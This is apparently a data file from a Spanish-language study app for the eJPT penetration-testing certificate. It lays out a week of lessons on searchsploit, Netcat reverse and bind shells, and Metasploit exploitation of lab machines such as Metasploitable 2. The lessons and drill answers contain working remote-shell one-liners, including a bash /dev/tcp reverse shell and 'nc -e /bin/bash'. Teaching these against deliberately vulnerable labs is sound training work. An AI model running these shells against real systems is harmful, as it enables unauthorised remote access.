import { StudyWeek } from "@/lib/types";

/**
 * MES 1 / SEMANA 4 — Vulnerability Assessment + Explotación consolidada.
 * Semana global: 4. Cierra el Mes 1 (fundamentos + huecos declarados).
 */
export const month1Week4: StudyWeek = {
  id: "m1-w4",
  monthId: "m1",
  title: "Semana 4 — Vulnerability Assessment y Explotación",
  goal: "Cerrar el Mes 1 uniendo todo: identificar vulnerabilidades, elegir el exploit correcto (Linux/Windows) y distinguir reverse vs bind shell sin dudar.",
  detailed: true,
  blocks: [
    {
      id: "m1-w4-b1",
      weekId: "m1-w4",
      order: 1,
      title: "Vulnerability Assessment: searchsploit y OpenVAS",
      objective: "A partir de una versión de servicio detectada por Nmap, encontrar un exploit público válido usando searchsploit.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "eJPT dedica un dominio completo a 'Vulnerability Assessment'. El flujo real: Nmap detecta versión -> buscas esa versión exacta en una base de exploits (searchsploit = Exploit-DB offline, o Nessus/OpenVAS para escaneo automatizado de CVEs). No necesitas memorizar CVEs, necesitas memorizar el PROCESO de búsqueda.",
      practiceSteps: [
        "Actualiza la base local de exploits: searchsploit -u",
        "Busca por nombre y versión de servicio: searchsploit apache 2.4.49",
        "Copia el exploit encontrado a tu carpeta de trabajo: searchsploit -m <ruta_del_exploit>",
        "Lee el exploit para entender qué hace antes de usarlo: cat <archivo_copiado> | less",
        "(Opcional si tienes acceso) corre un escaneo OpenVAS/Nessus contra el target y exporta el reporte de vulnerabilidades",
      ],
      subtopics: ["vuln-assessment"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando para buscar exploits de 'Apache 2.4.49' con searchsploit.", answer: "searchsploit apache 2.4.49" },
        { id: "d2", promptEs: "Escribe el comando para copiar (mirror) un exploit encontrado con searchsploit a tu directorio actual.", answer: "searchsploit -m <ruta_del_exploit>" },
        { id: "d3", promptEs: "Escribe el comando para actualizar la base de datos local de searchsploit.", answer: "searchsploit -u" },
      ],
      glossary: [
        { en: "CVE (Common Vulnerabilities and Exposures)", es: "vulnerabilidad y exposición común (identificador estándar)" },
        { en: "exploit database", es: "base de datos de exploits" },
        { en: "vulnerability scanner", es: "escáner de vulnerabilidades" },
      ],
      resources: [
        { label: "TryHackMe — Vulnerabilities 101", url: "https://tryhackme.com/room/vulnerabilities101", platform: "TryHackMe" },
        { label: "Exploit-DB (web, si no tienes searchsploit local)", url: "https://www.exploit-db.com/", platform: "Docs" },
      ],
      closingChecklist: [
        "Escribo searchsploit <servicio> <versión> de memoria",
        "Encontré y leí (no solo ejecuté) un exploit real de Exploit-DB",
      ],
    },
    {
      id: "m1-w4-b2",
      weekId: "m1-w4",
      order: 2,
      title: "Reverse shell vs Bind shell + Netcat",
      objective: "Explicar la diferencia entre reverse shell y bind shell, y levantar ambas manualmente con Netcat.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "Reverse shell: la VÍCTIMA inicia la conexión HACIA ti (útil cuando la víctima está detrás de firewall/NAT y no acepta conexiones entrantes — el caso más común en examen). Bind shell: TÚ te conectas HACIA la víctima (la víctima 'escucha'; requiere que su puerto sea alcanzable). En el examen, el 90% de los casos usarás reverse shell.",
      comparisonTable: {
        caption: "Reverse shell vs Bind shell",
        headers: ["Tipo", "¿Quién inicia la conexión?", "¿Cuándo se usa?", "Comando Netcat típico (atacante)"],
        rows: [
          ["Reverse shell", "La víctima se conecta a TI", "Víctima detrás de firewall/NAT (caso más común)", "nc -lvnp 4444 (escuchas en tu máquina)"],
          ["Bind shell", "TÚ te conectas a la víctima", "Víctima con puerto abierto y alcanzable directamente", "nc <IP víctima> <puerto> (te conectas tú)"],
        ],
      },
      practiceSteps: [
        "Levanta un listener en tu máquina (para reverse shell): nc -lvnp 4444",
        "Desde la 'víctima' (otra terminal/VM), envía una reverse shell: bash -i >& /dev/tcp/<TU_IP>/4444 0>&1",
        "Confirma que te llegó la shell en el listener",
        "Ahora prueba bind shell: en la víctima, nc -lvnp 5555 -e /bin/bash",
        "Desde tu máquina, conéctate: nc <IP_víctima> 5555",
      ],
      subtopics: ["reverse-vs-bind"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando Netcat para poner un listener en tu máquina, puerto 4444, esperando una reverse shell.", answer: "nc -lvnp 4444" },
        { id: "d2", promptEs: "Escribe el one-liner de bash para enviar una reverse shell hacia 10.8.0.15 puerto 4444.", answer: "bash -i >& /dev/tcp/10.8.0.15/4444 0>&1" },
        { id: "d3", promptEs: "Escribe el comando Netcat para conectarte (bind shell) a una víctima en 10.10.10.220 puerto 5555.", answer: "nc 10.10.10.220 5555" },
      ],
      glossary: [
        { en: "listener", es: "oyente / escucha" },
        { en: "one-liner", es: "comando de una sola línea" },
        { en: "NAT / firewall", es: "NAT / cortafuegos" },
      ],
      resources: [
        { label: "TryHackMe — Reverse Shells", url: "https://tryhackme.com/room/introtoshells", platform: "TryHackMe" },
        { label: "PayloadsAllTheThings — Reverse Shell Cheatsheet", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md", platform: "Docs" },
      ],
      closingChecklist: [
        "Explico reverse vs bind shell con la analogía propia, sin dudar",
        "Logré una reverse shell funcional con Netcat",
        "Logré una bind shell funcional con Netcat",
      ],
    },
    {
      id: "m1-w4-b3",
      weekId: "m1-w4",
      order: 3,
      title: "Explotación de servicios Linux (end-to-end)",
      objective: "Comprometer una máquina Linux completa: recon -> enumeración -> exploit -> shell -> flag, usando el flujo integral de las semanas 1-3.",
      durationMin: 50,
      type: "practice",
      theoryEs: "Sin teoría nueva. Bloque de aplicación pura: unir Nmap + enumeración + Metasploit/exploit manual contra una máquina Linux real.",
      practiceSteps: [
        "Nmap completo del target (recuerda -p- -sV -sC)",
        "Enumera cualquier servicio SMB/FTP/HTTP encontrado con las herramientas de Semana 2",
        "Busca el exploit correcto (searchsploit o Metasploit search) para la versión detectada",
        "Ejecuta el exploit, obtén shell, confirma con whoami / id",
        "Encuentra la flag (user.txt o similar) y documenta el flujo completo en tus notas",
      ],
      subtopics: ["exploit-linux"],
      resources: [
        { label: "Kioptrix Level 1 (end-to-end Linux local)", url: "https://www.vulnhub.com/entry/kioptrix-level-1-1,22/", platform: "VulnHub" },
        { label: "Metasploitable 2 — Samba / DistCC / vsftpd", url: "https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/", platform: "Local" },
      ],
      closingChecklist: [
        "Comprometí una máquina Linux de principio a fin sin ver walkthrough",
        "Documenté el flujo completo (recon->enum->exploit->shell->flag)",
      ],
    },
    {
      id: "m1-w4-b4",
      weekId: "m1-w4",
      order: 4,
      title: "Explotación Samba/UnrealIRCD (mismo flujo que un box Windows)",
      objective: "Comprometer Metasploitable 2 por un segundo vector (Samba usermap o UnrealIRCD) y confirmar shell con whoami.",
      durationMin: 50,
      type: "practice",
      theoryEs:
        "Sin Windows pirata. Practicas el mismo flujo Metasploit (search/use/set/exploit) contra Samba (unix/samba/usermap_script) o UnrealIRCD. Si más adelante construyes Metasploitable 3, ahí sí pruebas EternalBlue.",
      practiceSteps: [
        "Nmap -sV -p445,6667 <IP MS2>",
        "search usermap_script (o search unreal_ircd) en msfconsole",
        "show options → set RHOSTS → exploit. Confirma whoami",
        "Documenta el flujo. No hace falta hashdump SAM (es Linux)",
      ],
      subtopics: ["exploit-windows", "exploit-linux"],
      resources: [
        { label: "Rapid7 — Metasploitable 2 exploitability guide", url: "https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/", platform: "Docs" },
      ],
      closingChecklist: [
        "Comprometí MS2 por un segundo servicio distinto a vsftpd",
        "Confirmé acceso con whoami / sysinfo",
      ],
    },
    {
      id: "m1-w4-b5",
      weekId: "m1-w4",
      order: 5,
      title: "Drill combinado final de Mes 1",
      objective: "Responder de memoria, en menos de 20 minutos, el listado de 15 comandos clave del Mes 1 (Nmap, enumeración, Metasploit).",
      durationMin: 45,
      type: "drill",
      theoryEs: "Sin teoría nueva. Repetición final antes del cierre de mes y el primer simulacro completo de Mes 2.",
      practiceSteps: [
        "Sin ver apuntes, escribe en un editor de texto los 15 comandos clave (te los pide la app en Drills > Repaso Mes 1)",
        "Verifica cada uno contra el material de las semanas 1-4",
        "Cualquier comando que falles, repítelo 3 veces más antes de cerrar el bloque",
      ],
      subtopics: [
        "nmap-basic", "nmap-scripts", "enum4linux", "gobuster-dir", "hydra-bruteforce",
        "tool-selection", "msf-search-use", "msf-options", "msf-lhost-lport",
        "msf-sysinfo", "msf-hashdump", "msf-multihandler", "vuln-assessment", "reverse-vs-bind",
      ],
      closingChecklist: [
        "Escribí 12 de 15 comandos correctamente en el primer intento (80%)",
        "Repetí 3 veces más cualquier comando fallado",
      ],
    },
    {
      id: "m1-w4-b6",
      weekId: "m1-w4",
      order: 6,
      title: "Skill-check final de Mes 1 + cierre",
      objective: "Aprobar el skill-check integrador de Mes 1 (70%+) que cruza Nmap + enumeración + Metasploit, y marcar el checklist de cierre de mes.",
      durationMin: 45,
      type: "checkpoint",
      theoryEs:
        "Este es tu punto de control más importante hasta ahora. Si no llegas al 70% aquí, NO avances a Mes 2 — activa el ciclo de repaso dirigido (regla fija #9) hasta cerrar los sub-temas débiles.",
      practiceSteps: [
        "Toma el skill-check final de Mes 1 en la app (Simulacros > Skill-checks > Mes 1 Final)",
        "Si repruebas: identifica el/los sub-temas exactos fallados y sigue el ciclo de repaso antes de continuar",
        "Si apruebas: marca el checklist de cierre de Mes 1 completo",
      ],
      subtopics: [
        "nmap-basic", "nmap-scripts", "passive-recon", "enum4linux", "smb-manual",
        "gobuster-dir", "hydra-bruteforce", "tool-selection", "ftp-ssh-enum",
        "msf-search-use", "msf-options", "msf-lhost-lport", "msf-sysinfo",
        "msf-hashdump", "msf-multihandler", "msfvenom", "vuln-assessment",
        "exploit-linux", "exploit-windows", "reverse-vs-bind",
      ],
      closingChecklist: [
        "Aprobé el skill-check final de Mes 1 con 70% o más",
        "Cerré ambos huecos declarados: Metasploit y confusión Gobuster/Hydra/enum4linux",
        "Comprometí al menos 2 vectores en Metasploitable 2 (o Kioptrix) de principio a fin sin walkthrough",
        "Registré mis horas reales de estudio de este mes en la sección Progreso",
      ],
    },
  ],
};
